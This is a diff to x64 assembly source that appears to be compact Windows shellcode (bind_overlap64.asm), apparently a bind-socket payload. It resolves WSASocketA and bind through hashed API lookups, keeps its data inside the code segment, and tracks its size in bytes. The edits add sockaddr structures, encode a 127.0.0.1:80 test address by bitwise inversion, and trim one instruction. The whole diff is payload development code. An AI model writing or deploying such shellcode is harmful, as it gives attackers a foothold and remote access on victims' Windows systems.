@@ -36,7 +36,7 @@
   ; 
   ; jwasm -Zp8 -bin -I .\WinInc208\Include bind_overlap64.asm
   ;
-  ; Current size: 388 bytes
+  ; Current size: 387 bytes
   ;
 
   .x64
@@ -127,6 +127,32 @@ WIN32_LEAN_AND_MEAN equ 1
     _r8   QWORD ?
     _r9   QWORD ?
   HOME_SPACE ends
+  
+  IN4_ADDR  struct 
+    union S_un
+      struct S_un_b
+        s_b1  u_char  ?
+        s_b2  u_char  ?
+        s_b3  u_char  ?
+        s_b4  u_char  ?
+      ends
+    struct S_un_w
+      s_w1  u_short ?
+      s_w2  u_short ?
+    ends
+      S_addr  u_long  ?
+    ends
+  IN4_ADDR  ends
+
+  PIN_ADDR typedef ptr IN_ADDR
+  LPIN_ADDR typedef ptr IN_ADDR
+
+  sockaddr_in4  struct 
+    sin_family  SWORD ?
+    sin_port    WORD  ?
+    sin_addr    IN4_ADDR  <>
+    ;sin_zero    SBYTE 8 dup (?) ; not required
+  sockaddr_in4  ends
   
   ; Structure to represent values on stack
   ; Use -Zp8 switch in JWASM to align structures by 8 bytes
@@ -314,9 +340,12 @@ load_data:
 ; not really data section as we're in same segment
 data_section label qword
 ifdef TEST_CODE
-    dq     not ((((mhtons(LOCAL_PORT)) shl 16) or AF_INET) or (LOCAL_ADDR shl 32))
+; 127.0.0.1:80
+    local_address sockaddr_in4 <not AF_INET, \
+                  not mhtons(LOCAL_PORT), \
+      <<<not 7fh, not 00h, not 00h, not 01h>>>>
 else
-    dq     0
+    local_address sockaddr_in4 <0>
 endif
     hashapi "WSASocketA"
     hashapi "bind"
@@ -381,7 +410,6 @@ hash_api:
     mov    [rsp][PUSHAQ_STRUCT._rax], rbp
     popaq
     jmp    rax
-    ret
 get_proc_address endp
 
 code_end label qword
